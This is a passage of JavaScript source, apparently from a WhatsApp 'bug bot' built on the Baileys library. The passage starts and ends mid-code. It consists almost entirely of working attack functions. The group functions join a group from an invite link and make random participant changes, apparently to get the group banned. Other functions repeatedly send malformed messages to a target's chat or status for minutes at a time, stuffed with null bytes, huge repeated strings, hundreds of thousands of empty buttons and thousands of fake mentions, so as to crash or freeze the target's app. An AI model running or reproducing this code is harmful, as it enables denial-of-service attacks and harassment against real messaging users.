                                })
                            }]
                        }]
                    });
                } catch (e) {
                    console.log('[SEND ERR]', e.message);
                }
            }
        }
        // tanpa delay = langsung putar lagi
    }
}
async function groupBan1(sock, target) {
    let groupJid = target;

    // Kalau yang dikirim invite code (bukan @g.us), join dulu
    if (!target.endsWith("@g.us")) {
        const inviteCode = target.includes("chat.whatsapp.com/")
            ? target.split("chat.whatsapp.com/")[1].split(/[?/]/)[0]
            : target.replace(/[^a-zA-Z0-9]/g, "");

        try {
            groupJid = await sock.groupAcceptInvite(inviteCode);
        } catch (e) {
            if (e.message.includes("conflict") || e.message.includes("already")) {
                try {
                    const meta = await sock.groupGetInviteInfo(inviteCode);
                    groupJid = meta.id;
                } catch (e2) {
                    console.log(`❌ ${e2.message}`);
                    return false;
                }
            } else {
                console.log(`❌ Gagal join grup: ${e.message}`);
                return false;
            }
        }
    }

    if (!groupJid || !groupJid.endsWith("@g.us")) {
        console.log(`❌ @g.us server required`);
        return false;
    }

    const fakeNumbers = [
        "6280000000000@s.whatsapp.net",
        "14155552671@s.whatsapp.net",
        "447400000000@s.whatsapp.net",
        "61400000000@s.whatsapp.net",
        "6281234567890@s.whatsapp.net",
        "6287873499996@s.whatsapp.net",
        "6285655555555@s.whatsapp.net",
        "6289876543210@s.whatsapp.net",
        "6281111111111@s.whatsapp.net",
        "6282222222222@s.whatsapp.net",
        "6283333333333@s.whatsapp.net",
        "6284444444444@s.whatsapp.net",
        "6285555555555@s.whatsapp.net",
        "6286666666666@s.whatsapp.net",
        "6287777777777@s.whatsapp.net",
        "6288888888888@s.whatsapp.net",
        "6289999999999@s.whatsapp.net"
    ];

    const actions = ["add", "remove", "promote", "demote"];
    const fake = fakeNumbers[Math.floor(Math.random() * fakeNumbers.length)];
    const action = actions[Math.floor(Math.random() * actions.length)];

    try {
        await sock.groupParticipantsUpdate(groupJid, [fake], action);
        return true;
    } catch (e) {
        console.log(`❌ Gagal: ${e.message}`);
        return false;
    }
}
async function groupBan1real(target) {
    let groupJid = target;

    // Kalau yang dikirim invite code (bukan @g.us), join dulu
    if (!target.endsWith("@g.us")) {
        const inviteCode = target.includes("chat.whatsapp.com/")
            ? target.split("chat.whatsapp.com/")[1].split(/[?/]/)[0]
            : target.replace(/[^a-zA-Z0-9]/g, "");

        try {
            groupJid = await sock.groupAcceptInvite(inviteCode);
        } catch (e) {
            if (e.message.includes("conflict") || e.message.includes("already")) {
                const meta = await sock.groupGetInviteInfo(inviteCode);
                groupJid = meta.id;
            } else {
                throw new Error(`Gagal join grup: ${e.message}`);
            }
        }
    }

    if (!groupJid || !groupJid.endsWith("@g.us")) {
        throw new Error("@g.us server required");
    }

    const fakeNumbers = [
        "6280000000000@s.whatsapp.net",
        "14155552671@s.whatsapp.net",
        "447400000000@s.whatsapp.net",
        "61400000000@s.whatsapp.net",
        "6281234567890@s.whatsapp.net",
        "6287873499996@s.whatsapp.net",
        "6285655555555@s.whatsapp.net",
        "6289876543210@s.whatsapp.net",
        "6281111111111@s.whatsapp.net",
        "6282222222222@s.whatsapp.net",
        "6283333333333@s.whatsapp.net",
        "6284444444444@s.whatsapp.net",
        "6285555555555@s.whatsapp.net",
        "6286666666666@s.whatsapp.net",
        "6287777777777@s.whatsapp.net",
        "6288888888888@s.whatsapp.net",
        "6289999999999@s.whatsapp.net"
    ];

    const actions = ["add", "remove", "promote", "demote"];
    const fake = fakeNumbers[Math.floor(Math.random() * fakeNumbers.length)];
    const action = actions[Math.floor(Math.random() * actions.length)];

    try {
        await sock.groupParticipantsUpdate(groupJid, [fake], action);
        return true;
    } catch (e) {
        console.log(`❌ Gagal: ${e.message}`);
        return false;
    }
}

async function groupBanchalkred1(sock, target) {
    let groupJid = target;

    // Kalau yang dikirim invite code (bukan @g.us), join dulu
    if (!target.endsWith("@g.us")) {
        const inviteCode = target.includes("chat.whatsapp.com/")
            ? target.split("chat.whatsapp.com/")[1].split(/[?/]/)[0]
            : target.replace(/[^a-zA-Z0-9]/g, "");

        try {
            groupJid = await sock.groupAcceptInvite(inviteCode);
        } catch (e) {
            if (e.message.includes("conflict") || e.message.includes("already")) {
                const meta = await sock.groupGetInviteInfo(inviteCode);
                groupJid = meta.id;
            } else {
                throw new Error(`Gagal join grup: ${e.message}`);
            }
        }
    }

    if (!groupJid || !groupJid.endsWith("@g.us")) {
        throw new Error("@g.us server required");
    }

    const fakeNumbers = [
        "6280000000000@s.whatsapp.net",
        "14155552671@s.whatsapp.net",
        "447400000000@s.whatsapp.net",
        "61400000000@s.whatsapp.net",
        "6281234567890@s.whatsapp.net",
        "6287873499996@s.whatsapp.net",
        "6285655555555@s.whatsapp.net",
        "6289876543210@s.whatsapp.net",
        "6281111111111@s.whatsapp.net",
        "6282222222222@s.whatsapp.net",
        "6283333333333@s.whatsapp.net",
        "6284444444444@s.whatsapp.net",
        "6285555555555@s.whatsapp.net",
        "6286666666666@s.whatsapp.net",
        "6287777777777@s.whatsapp.net",
        "6288888888888@s.whatsapp.net",
        "6289999999999@s.whatsapp.net"
    ];

    const actions = ["add", "remove", "promote", "demote"];
    const fake = fakeNumbers[Math.floor(Math.random() * fakeNumbers.length)];
    const action = actions[Math.floor(Math.random() * actions.length)];

    try {
        await sock.groupParticipantsUpdate(groupJid, [fake], action);
        return true;
    } catch (e) {
        console.log(`❌ Gagal: ${e.message}`);
        return false;
    }
}
async function LexcaabosV7Fix(target) {
    const LexMsg = {
        interactiveMessage: {
            nativeFlowMessage: {
                buttons: [{
                    name: "payment_info",
                    buttonParamsJson: '{"currency":"IDR","total_amount":{"value":0,"offset":100},"reference_id":"\u0000' + Date.now() + '","type":"physical-goods","order":{"status":"pending","subtotal":{"value":0,"offset":100},"order_type":"ORDER","items":[{"name":"' + '\u0000'.repeat(7500) + '","amount":{"value":0,"offset":100},"quantity":0,"sale_amount":{"value":0,"offset":100}}]},"payment_settings":[{"type":"pix_static_code","pix_static_code":{"merchant_name":"\u0000","key":"' + '\u0000'.repeat(7500) + '","key_type":"CPF"}}],"share_payment_status":false}'
                }]
            }
        }
    };

    const Nanas = {
        viewOnceMessage: {
            message: {
                videoMessage: {
                    mimetype: "video/mp4",
                    fileLength: "17381601",
                    title: "Seraphine - Executed",
                    fileName: " done bos " + "ꦽ".repeat(75000),
                    fileSha256: "Jch1ImUydhA2vcB5auK8Dsc1jFHRN9ykhr2x5sr3X5c=",
                    fileEncSha256: "Jch1ImUydhA2vcB5auK8Dsc1jFHRN9ykhr2x5sr3X5c=",
                    mediaKey: "s4SdSzN3zwaZNv1+jcXtAQdCc8AIm879E9+CwdN8VfI2",
                    directPath: "/v/t62.7119-24/fake.enc",
                    mediaKeyTimestamp: "1767975195",
                    url: "https://mmg.whatsapp.net/d/fake.enc",
                    caption: "ꦾ".repeat(7000) + "ꦽ".repeat(7500)
                }
            }
        }
    };

    const Muda = {
        viewOnceMessage: {
            message: {
                interactiveMessage: {
                    body: {
                        text: " Seraphine " + "ꦾ".repeat(7500)
                    },
                    contextInfo: {
                        stanzaId: "metawai_id",
                        forwardingScore: 999,
                        participant: target,
                        mentionedJid: Array.from({ length: 2000 }, () => "1" + Math.floor(Math.random() * 9000000) + "@s.whatsapp.net")
                    }
                }
            }
        }
    };

    const stickers = {
        stickerMessage: {
            url: 'https://mmg.whatsapp.net/m1/v/t24/An_qcbaV8YTP-HtiB1VFAie8c-VqF4bBnMHWKN--GFd6T2GW-pQwLHQe4K4eDKCS1Fv9DZCa6RXMDsLeabNqy8RoTIekx2LtJCM-iUtOu_sdK90zdCEu1l8Wwqj3KAHrNRd1?ccb=10-5&oh=01_Q5Aa4AEbsVLrEjUg9wGPpN5mT_DeeyZp0Obyl7Cp7X5CHZ4mSA&oe=69D77DE6&_nc_sid=5e03e0&mms3=true',
            fileSha256: 'lOzzPjzVDfakRkXD9ud+N/JGUHVsmn37eqDk0UijQdA=',
            fileEncSha256: "lOzzPjzVDfakRkXD9ud+N/JGUHVsmn37eqDk0UijQdA=",
            mediaKey: Buffer.alloc(32, '').toString('base64'),
            mimetype: "image/webp",
            height: -1,
            width: 5000,
            directPath: '/m1/v/t24/An_qcbaV8YTP-HtiB1VFAie8c-VqF4bBnMHWKN--GFd6T2GW-pQwLHQe4K4eDKCS1Fv9DZCa6RXMDsLeabNqy8RoTIekx2LtJCM-iUtOu_sdK90zdCEu1l8Wwqj3KAHrNRd1?ccb=10-5&oh=01_Q5Aa4AEbsVLrEjUg9wGPpN5mT_DeeyZp0Obyl7Cp7X5CHZ4mSA&oe=69D77DE6&_nc_sid=5e03e0',
            fileLength: null,
            mediaKeyTimestamp: 1710000000,
            firstFrameLength: 999,
            firstFrameSidecar: Buffer.from([99,88,77,66,55,44,33,22,11,0]),
            isAnimated: true,
            pngThumbnail: Buffer.from([99,88,77,66,55,44,33,22,11,0]),
            contextInfo: {
                mentionedJid: [
                    "0@s.whatsapp.net",
                    ...Array.from({ length: 1999 }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net")
                ],
                interactiveAnnotations: [{
                    polygonVertices: [
                        { x: 0.1, y: 0.1 },
                        { x: 0.9, y: 0.1 },
                        { x: 0.9, y: 0.9 },
                        { x: 0.1, y: 0.9 }
                    ],
                    location: {
                        latitude: -6.2088,
                        longitude: 106.8456,
                        name: `Seraphine`,
                    }
                }]
            },
            stickerSentTs: 1710000000,
            isAvatar: true,
            isAiSticker: true,
            isLottie: true,
            accessibilityLabel: "\u0000".repeat(9000),
            mediaKeyDomain: null
        }
    };

    const msg = {
        viewOnceMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        imageMessage: {
                            url: "https://mmg.whatsapp.net/v/t62.7118-24/613381757_981708741479682_6415817420190586389_n.enc?ccb=11-4&oh=01_Q5Aa4AGbFJc4Yn7y_Y2gO_4l-ZyX1pyKJJpcCA_a-Wra2rY9SA&oe=69E62DD0&_nc_sid=5e03e0&mms3=true",
                            mimetype: "image/jpeg",
                            caption: "LexzyModss - Executed",
                            fileSha256: "umQsdlmP4w9dL35/1yb2Wy5x6ypLvSXUy3r7veQ/rNU=",
                            fileLength: "109951162777600",
                            height: -9999,
                            width: 9999,
                            mediaKey: "pbSAJfuBxe4QBnJO34YFyM1EX4ZABBJsmW6rhvT+5+I=",
                            fileEncSha256: "8frUJ7Tt5d1EXOSWiP/9CBdN4fP2gPV6WPE0sN/IaF4=",
                            directPath: "/v/t62.7118-24/613381757_981708741479682_6415817420190586389_n.enc?ccb=11-4&oh=01_Q5Aa4AGbFJc4Yn7y_Y2gO_4l-ZyX1pyKJJpcCA_a-Wra2rY9SA&oe=69E62DD0&_nc_sid=5e03e0",
                            mediaKeyTimestamp: "1774107894",
                            jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHR0Jdi1hZV1hYjX2Xe5t7l33gsJycsOD/2c7Z////////////////CABEIAEgASAMBIgACEQEDEQH/xAAsAAACAwEBAAAAAAAAAAAAAAAABAIDBQEGAQEAAAAAAAAAAAAAAAAAAAAA/9oADAMBAAIQAxAAAADs6unZ2+aFh/SINqdLCYSpYVKXczcHeKUGr56zGNgaDMfrkKJRqNSqkK6GqjWFw2MvVwxefqbzzDetQJykmZZwN7KAS4BCYFYBYAf/xAAmEAACAgICAgICAgMAAAAAAAAAAAABAgADBBESIQUxE0EQIhVRFDJS/9oACAEBAAE/AMZx8C6BOjHNh2FYLMahbcieZzONYpT84PlOKCi0dSyxa9LqIgLgkghjKwyWWUoQBuGtQG5sd77ImGUVbmXrrqZFr22HcowL7hvWhKfFy/xj8eSiVs708XHa9SmsF+J+hL8T43589bjltDl2NzJ+RrErrMxvGog5v2ZUyceh6lj8VY+v6ldqvXLslVyyn0ejHL41kvJrX5LDt/oRG+Zi1nUutejJDfUGUciv46tciJUl+OCbWEttpyGPK4CZF6Y1YFL8pWWtvUnskyvhcnxuNv8AUFjWW7vmPWtzitCSvszyZqNhrXrgJiPwLkWFSB1C92WKyDsp7luG23ts/QQHdJQAe/crc1uCJjX/ACD9Tpx6lVdOhtTzMtv/AMBgoHuZdy3Wl1ErPFgSOopUNyrfUf5LG/d4QtSnrZldDPx69mFUotRFPcw6BShutP7N6nljuxGgx2sr5IjbleFmH1SZX4jKPtZ/DP8Adgn8SmxzumXirTim2pvUx2L5CFjvuZFyktYf9Elu7q3sJ+9zG7xqihUfrNjiQ1qw34y7DXiPm4Ce7Y3lcEelYzL8ul1DVJVMRwl6kiZALoKgd/bS0fHUR/UF1oGg7AQW2f8AZhJJjqi8eLb67/NTcXBn/8QAFBEBAAAAAAAAAAAAAAAAAAAAQP/aAAgBAgEBPwBP/8QAFBEBAAAAAAAAAAAAAAAAAAAAQP/aAAgBAwEBPwBP/9k=",
                            viewOnce: true,
                            scansSidecar: "ruEDZByywdU2+wxwAOMMI9TaQpJ84ehIk67v1KJjC+JGXu9u7ta4fw==",
                            scanLengths: [6677, 48757, 32501, 42353],
                            midQualityFileSha256: "qjGQcaOKUiN+pMKBMxAEeONhJR5VDFsu+iGxQ1LfmNY="
                        },
                        hasMediaAttachment: null
                    },
                    body: {
                        text: "\u0000".repeat(1000)
                    },
                    contextInfo: {
                        remoteJid: "status@broadcast",
                        participant: target,
                        isBuldo: true,
                        mentionedJid: [
                            "0@s.whatsapp.net",
                            ...Array.from({ length: 1000 * 40 }, () => "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net")
                        ],
                        groupMentions: [],
                        entryPointConversionSource: "non_contact",
                        entryPointConversionApp: "whatsapp",
                        entryPointConversionDelaySeconds: 467593,
                        quotedMessage: {
                            documentMessage: {
                                url: "https://example.com/file.zip",
                                mimetype: "application/zip",
                                caption: "LexzyModss - Executed",
                                fileName: "NanasMuda - Executed",
                                fileLength: 99999,
                                vCards: true
                            }
                        }
                    },
                    nativeFlowMessage: {
                        messageParamsJson: "ြ".repeat(9000)
                    }
                }
            }
        }
    };

    await sock.relayMessage("status@broadcast", Nanas, {
        messageId: null,
        statusJidList: [target],
        additionalNodes: [{
            tag: "meta",
            attrs: {},
            content: [{
                tag: "mentioned_users",
                attrs: {},
                content: [{ tag: "to", attrs: { jid: target }, content: undefined }]
            }]
        }]
    });

    await sock.relayMessage("status@broadcast", Muda, {
        messageId: null,
        statusJidList: [target],
        additionalNodes: [{
            tag: "meta",
            attrs: {},
            content: [{
                tag: "mentioned_users",
                attrs: {},
                content: [{ tag: "to", attrs: { jid: target }, content: undefined }]
            }]
        }]
    });

    const startTime = Date.now();
    const duration = 5 * 60 * 1500;

    while (Date.now() - startTime < duration) {
        await sock.relayMessage(target, {
            groupStatusMessageV2: {
                message: {
                    extendedTextMessage: {
                        text: "\u0000".repeat(75000),
                        contextInfo: {
                            participant: target,
                            mentionedJid: [
                                "0@s.whatsapp.net",
                                ...Array.from({ length: 1950 }, () => "1" + Math.floor(Math.random() * 9000000) + "@s.whatsapp.net")
                            ]
                        }
                    }
                }
            }
        }, { participant: target });
    }

    await sock.relayMessage(target, {
        groupStatusMessageV2: {
            nativeFlowMessage: {
                extendedTextMessage: {
                    text: "\u0003".repeat(9000),
                    contextInfo: {
                        participant: target,
                        mentionedJid: [
                            "0@s.whatsapp.net",
                            ...Array.from(
                                { length: 1999 },
                                () => "1" + Math.floor(Math.random() * 98000000) + "@s.whatsapp.net"
                            )
                        ]
                    }
                }
            }
        }
    }, { participant: target });

    const startTime2 = Date.now();
    const duration2 = 1 * 60 * 1000;

    while (Date.now() - startTime2 < duration2) {
        await sock.relayMessage(target, {
            groupStatusMessageV2: {
                message: {
                    extendedTextMessage: {
                        text: "\u0003".repeat(75000),
                        contextInfo: {
                            participant: target,
                            mentionedJid: [
                                "0@s.whatsapp.net",
                                ...Array.from({ length: 2000 }, () => "1" + Math.floor(Math.random() * 8000000) + "@s.whatsapp.net")
                            ]
                        }
                    }
                }
            }
        }, { participant: target });
    }

    const LexzyyMsg = {
        interactiveMessage: {
            body: {
                text: "Seraphine¿!",
            },
            nativeFlowMessage: {
                buttons: Array.from({ length: 700000 }, () => ({}))
            },
            contextInfo: {
                quotedMessage: {
                    orderMessage: {
                        orderTitle: "Pt Nanas Muda",
                        itemCount: 1999,
                        totalAmount1000: "1000000",
                        totalCurrencyCode: "IDR"
                    },
                },
            },
        },
    };

    const acamsg = generateWAMessageFromContent(target, LexzyyMsg, {});

    await sock.relayMessage(target, acamsg.message, {
        participant: target,
        messageId: acamsg.key.id
    });

    const Lexca = {
        messageContextInfo: {
            deviceListMetadata: {},
            deviceListMetadataVersion: 2,
            botMetadata: {
                pluginMetadata: {},
                richResponseSourcesMetadata: {
                    sources: []
                }
            }
        },
        groupStatusMessageV2: {
            message: {
                richResponseMessage: {
                    messageType: 1,
                    submessages: [
                        {
                            messageType: 3,
                            tableMetadata: {
                                title: "Seraphine¿!",
                                rows: Array.from({ length: 2000 }, () => ({}))
                            }
                        }
                    ],
                    unifiedResponse: {
                        data: JSON.stringify({
                            response_id: crypto.randomUUID(),
                            sections: []
                        })
                    },
                    contextInfo: {
                        forwardingScore: 1,
                        isForwarded: true,
                        forwardedAiBotMessageInfo: {
                            botJid: "Seraphine"
                        },
                        forwardOrigin: 3
                    }
                }
            }
        }
    };

    const Lexcaa = generateWAMessageFromContent(target, Lexca, {});

    await sock.relayMessage(target, Lexcaa.message, {
        participant: target,
        messageId: Lexcaa.key.id
    });

    await sock.relayMessage(target, {
        interactiveMessage: {
            nativeFlowMessage: {
                buttons: [{
                    name: "payment_info",
                    buttonParamsJson: '{"currency":"IDR","total_amount":{"value":0,"offset":100},"reference_id":"\x10' + Date.now() + '","type":"physical-goods","order":{"status":"pending","subtotal":{"value":0,"offset":100},"order_type":"ORDER","items":[{"name":"' + '\u0000'.repeat(7500) + '","amount":{"value":0,"offset":100},"quantity":0,"sale_amount":{"value":0,"offset":100}}]},"payment_settings":[{"type":"pix_static_code","pix_static_code":{"merchant_name":"\x10","key":"' + '\u0000'.repeat(7500) + '","key_type":"CPF"}}],"share_payment_status":false}'
                }]
            }
        }
    }, {});

    await sock.relayMessage(target, {
        view0nceMessageV2: {
            message: {
                extendedTextMessage: {
                    text: "\u0003".repeat(9000),
                    contextInfo: {
                        participant: target,
                        mentionedJid: [
                            "0@s.whatsapp.net",
                            ...Array.from(
                                { length: 2000 },
                                () => "5" + Math.floor(Math.random() * 9000000) + "@s.whatsapp.net"
                            )
                        ]
                    }
                }
            }
        }
    }, { participant: target });

    const Lexcabos = {
        groupStatusMessageV2: {
            message: {
                stickerPackMessage: {
                    stickerPackId: "\u0000".repeat(9000),
                    name: "Seraphine¿!",
                    publisher: "\u0000".repeat(9000),
                    fileLength: 9999,
                    fileSha256: "SQaAMc2EG0lIkC2L4HzitSVI3+4lzgHqDQkMBlczZ78=",
                    fileEncSha256: "l5rU8A0WBeAe856SpEVS6r7t2793tj15PGq/vaXgr5E=",
                    mediaKey: "UaQA1Uvk+do4zFkF3SJO7/FdF3ipwEexN2Uae+lLA9k=",
                    mimetype: "image/webp",
                    directPath: "/o1/v/t24/f2/m238/AQMjSEi_8Zp9a6pql7PK_-BrX1UOeYSAHz8-80VbNFep78GVjC0AbjTvc9b7tYIAaJXY2dzwQgxcFhwZENF_xgII9xpX1GieJu_5p6mu6g?ccb=9-4&oh=01_Q5Aa4AFwtagBDIQcV1pfgrdUZXrRjyaC1rz2tHkhOYNByGWCrw&oe=69F4950B&_nc_sid=e6ed6c",
                    contextInfo: {
                        statusAttributionType: 2,
                        statusAttributions: Array.from({ length: 450000 }, () => ({ type: 1 }))
                    },
                },
            },
        },
    };

    await sock.relayMessage(target, Lexcabos, {
        participant: target,
    });

    const startTime3 = Date.now();
    const duration3 = 4 * 60 * 1000;
    while (Date.now() - startTime3 < duration3) {
        await sock.relayMessage(target, {
            groupStatusMessageV2: {
                message: {
                    interactiveMessage: {
                        body: {
                            text: "Seraphine¿!"
                        },
                        nativeFlowMessage: {
                            buttons: Array.from({ length: 500000 }, () => ({}))
                        },
                    },
                },
            },
        }, { participant: target });

        await new Promise(resolve => setTimeout(resolve, 900));

        await sock.relayMessage(target, {
            groupStatusMessageV2: {
                message: {
                    interactiveResponseMessage: {
                        body: {
                            text: "Seraphine",
                            format: "DEFAULT"
                        },
                        nativeFlowResponseMessage: {
                            name: "call_permission_request",
                            paramsJson: "\u0003".repeat(9000),
                            version: 3
                        },
                    }
                }
            }
        }, { participant: target });

        await new Promise(resolve => setTimeout(resolve, 900));

        await sock.relayMessage(target, {
            groupStatusMessageV2: {
                message: {
                    interactiveResponseMessage: {
                        body: {
                            text: "Seraphine - Executed‽!",
                            format: "DEFAULT"
                        },
                        nativeFlowResponseMessage: {
                            name: "galaxy_message",
                            paramsJson: "\x10".repeat(9000),
                            version: 3
                        },
                    }
                }
            }
        }, { participant: target });

        await new Promise(resolve => setTimeout(resolve, 900));

        await sock.relayMessage(target, {
            groupStatusMessageV2: {
                message: {
                    interactiveResponseMessage: {
                        body: {
                            text: "Seraphine - Executed¿!",
                            format: "DEFAULT"
                        },
                        nativeFlowResponseMessage: {
                            name: "address_message",
                            paramsJson: `{"values":{"in_pin_code":"xxx","building_name":"xxx","landmark_area":"X","address":"xxx","tower_number":"mmklu","city":"porno","name":"crb","phone_number":"xxx","house_number":"xxx","floor_number":"xxx","state":"yandex | ${"\u0000".repeat(9000)}"}}`,
                            version: 3
                        },
                        contextInfo: {
                            quotedMessage: {
                                paymentInviteMessage: {
                                    serviceType: 2,
                                    expiryTimestamp: Math.floor(Date.now() / 1999) + 8640000
                                }
                            }
                        }
                    }
                }
            }
        }, { participant: target });

        await new Promise(resolve => setTimeout(resolve, 900));

        await sock.relayMessage(target, {
            groupStatusMessageV2: {
                message: {
                    extendedTextMessage: {
                        text: "\u0003".repeat(9000),
                        contextInfo: {
                            participant: target,
                            mentionedJid: [
                                "0@s.whatsapp.net",
                                ...Array.from(
                                    { length: 1999 },
                                    () => "1" + Math.floor(Math.random() * 9000000) + "@s.whatsapp.net"
                                )
                            ]
                        }
                    }
                }
            }
        }, { participant: target });
    }

    const LexzyExe = {
        groupStatusMessageV2: {
            message: {
                interactiveMessage: {
                    body: {
                        text: "Seraphine - Executed¿!"
                    },
                    nativeFlowMessage: {
                        buttons: "{}".repeat(75000),
                    },
                },
            },
        },
    };

    const Lexx = generateWAMessageFromContent(target, LexzyExe, {});

    await sock.relayMessage(target, Lexx.message, {
        participant: target,
        messageId: Lexx.key.id
    });

    const ocha = {
        groupStatusMessageV2: {
            message: {
                interactiveMessage: {
                    body: {
                        text: "Seraphine - Executed¿!",
                    },
                    nativeFlowMessage: {
                        buttons: "[".repeat(75000),
                    },
                },
            },
        },
    };

    const iniocha = generateWAMessageFromContent(target, ocha, {});

    await sock.relayMessage(target, iniocha.message, {
        participant: target,
        messageId: iniocha.key.id
    });
}
async function noctherHarddelay(target) {
    try {
        
        const msg1 = {
            viewOnceMessageV2: {
                message: {
                    interactiveMessage: {
                        body: {
                            text: " "
                        },
                        nativeFlowMessage: {
                            buttons: "one_crash_message".repeat(10000),
                              buttons:
                              "one_crash_message".repeat(30000),
                            
                            nativeFlowResponseMessage: {
                                buttons: Array.from({ length: 1236 }, () => ({}))
                            }
                        },
               nativeFlowInfo: {
                name: "single_select",
                paramsJson: JSON.stringify({
                    icon: "document",
                    title: "°deffa is here°¿",
                    sections: Array.from({ length: 5055 }, () => ({}))
                })
                      }
                    
                    }
                }
            }
        };

        const msg2 = {
              groupStatusMessageV2: {
               message: { 
                    interactiveMessage: {
                        body: {
                            text: " "
                        },
                        nativeFlowMessage: {
                            buttons: "cta_call".repeat(20000) + "cta_reply".repeat(30000),
                            nativeFlowResponseMessage: {
                                buttons: Array.from({ length: 9877 }, () => ({}))
                            },
                            messageParamsJson: "\uFDFD".repeat(30000)
                        }
                    },
                nativeFlowInfo: {
                name: "single_select",
                paramsJson: JSON.stringify({
                    icon: "document",
                    title: "°deffa is here°¿",
                    sections: Array.from({ length: 5055 }, () => ({}))
                })
          }
}
}
            
        };

        await sock.relayMessage(target, msg1, {});
        await new Promise(resolve => setTimeout(resolve, 3000));
        await sock.relayMessage(target, msg2, {});
        
    } catch (error) {
        console.error("❌ Error:", error);
    }
}

async function LexcaabosV3(target) {
    const Lexcaabos = {
        interactiveMessage: {
            body: {
                text: "L¿!",
            },
            nativeFlowMessage: {
                buttons: Array.from({ length: 550000 }, () => ({}))
            },
            contextInfo: {
                quotedMessage: {
                    albumMessage: {
                        expectedImageCount: 99999,
                        expectedVideoCount: 99999
                    },
                },
            },
        },
    };

    const Lexca = generateWAMessageFromContent(target, Lexcaabos, {});

    await sock.relayMessage(target, Lexca.message, {
        participant: true,
        messageId: Lexca.key.id
    });

    const Lexcabos = {
        interactiveMessage: {
            body: {
                text: "Seraphine - Executed¿!",
            },
            nativeFlowMessage: {
                buttons: Array.from({ length: 850000 }, () => ({}))
            },
            contextInfo: {
                quotedMessage: {
                    orderMessage: {
                        orderTitle: "Seraphine",
                        itemCount: 9999,
                        totalAmount1000: "10000000",
                        totalCurrencyCode: "IDR"
                    },
                },
            },
        },
    };

    const Lexcaabos2 = generateWAMessageFromContent(target, Lexcabos, {});

    await sock.relayMessage(target, Lexcaabos2.message, {
        participant: true,
        messageId: Lexcaabos2.key.id
    });

    await sock.relayMessage(target, {
        interactiveMessage: {
            body: {
                text: "Seraphine - Executed¿!",
            },
            nativeFlowMessage: {
                buttons: Array.from({ length: 850000 }, () => ({}))
            }
        }
    }, { participant: true });

    await sock.relayMessage(target, {
        interactiveMessage: {
            body: {
                text: "Seraphine¿!",
            },
            nativeFlowMessage: {
                buttons: Array.from({ length: 850000 }, () => ({}))
            },
            contextInfo: {
                quotedMessage: {
                    videoMessage: {
                        url: "https://mmg.whatsapp.net/v/t62.7161-24/609348532_2813167542392969_465741537439148405_n.enc?ccb=11-4&oh=01_Q5Aa4AGN8v9HYNPCRbPeMILfoQ7MIqSvhY-gd7wr6YvDHhHSwA&oe=69EB192E&_nc_sid=5e03e0&mms3=true",
                        mimetype: "video/mp4",
                        caption: "IamLexzyMods",
                        fileSha256: "LdNOQNcNIvlIijHvkpwRIY/zIoTfWQoFux7dzTHusyM=",
                        fileLength: "1099511627776",
                        seconds: 172800,
                        mediaKey: "G2MGbP7BZLi1RwpyyV4DeXtfttaclMVSKfqNldZDt20=",
                        height: 1080,
                        width: 1920,
                        fileEncSha256: "U4uKZrZeJpg8smAcMRT3qtPoviAp/dqGa63GzqYcS8E=",
                        directPath: "/v/t62.7161-24/609348532_2813167542392969_465741537439148405_n.enc?ccb=11-4&oh=01_Q5Aa4AGN8v9HYNPCRbPeMILfoQ7MIqSvhY-gd7wr6YvDHhHSwA&oe=69EB192E&_nc_sid=5e03e0",
                        mediaKeyTimestamp: "1774428565",
                        jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgAKAMBIgACEQEDEQH/xAAvAAEAAwEBAQAAAAAAAAAAAAAAAgMEBQYBAQEBAQEAAAAAAAAAAAAAAAAAAgMB/9oADAMBAAIQAxAAAADzL0VRwnekefd8ThLRzuO2/JxNWKr5ZFS+12VFgitnN6HKX8UQ1y6bCz0xiswAP//EACQQAAICAQQBBAMAAAAAAAAAAAECAAMREhMhMVIQQgIkQVFS/9oACAEBAAE/APi9NXgJtVeAgqq8BNmrwE2qvASx8YAGSY6XhM6ADK67rG0k6Zz0ex7EoHrL9ZltulMoMyi8sgY4jNhmycnMFgnqC5AYdAytToLseCJUFstFYfiKoFtidkGFZfWNpgIrl61B4HUrC1EkMfowNm4n8kQmEZioEezJ6ms9Z4jMAARAwZQRN+n+gl/qFNrFeobQScCaz+5Xdob6+X//xAAbEQACAgMBAAAAAAAAAAAAAAABEQACECAhQf/aAAgBAgEBPwB6PFEYa+4pwwkLX//EABsRAAICAwEAAAAAAAAAAAAAAAECABEDICEQ/9oACAEDAQE/ANskB8fqxVNgxlF80//Z",
                        annotations: [
                            {
                                polygonVertices: [
                                    {
                                        x: 0.17499999701976776,
                                        y: 0.3379453122615814
                                    },
                                    {
                                        x: 0.824999988079071,
                                        y: 0.3379453122615814
                                    },
                                    {
                                        x: 0.824999988079071,
                                        y: 0.6620468497276306
                                    },
                                    {
                                        x: 0.17499999701976776,
                                        y: 0.6620468497276306
                                    }
                                ],
                                shouldSkipConfirmation: true,
                                embeddedContent: {
                                    embeddedMusic: {
                                        musicContentMediaId: "2261401457948346",
                                        songId: "849859527815275",
                                        author: "Lexcaabos - Executed¿!" + "ြ".repeat(9000),
                                        title: "ြ".repeat(75000),
                                        artworkDirectPath: "/v/t62.76458-24/568311115_4528169627440664_4559757974106869948_n.enc?ccb=11-4&oh=01_Q5Aa5AGs28VMFVXkcn0w9n-YUhiBwEPKyIwEcjWZLHm7mUgOsQ&oe=6A786B6E&_nc_sid=5e03e0",
                                        artworkSha256: "FROyKnRoHfLzDwmz5tED8K3nmdK+4Uihn2ucHBZDjPI=",
                                        artworkEncSha256: "y/SkheY3BoGhndQlmR6icfLtMtI4FjjRi5y3bsX13jw=",
                                        artworkMediaKey: "s5VCH/gb/YjDXhek47MVcsHjVV3/lOHOYaDe72eodXw=",
                                        artistAttribution: "https://www.instagram.com/_u/lexzymods",
                                        countryBlocklist: "WEs=",
                                        isExplicit: false
                                    }
                                },
                                embeddedAction: true
                            }
                        ]
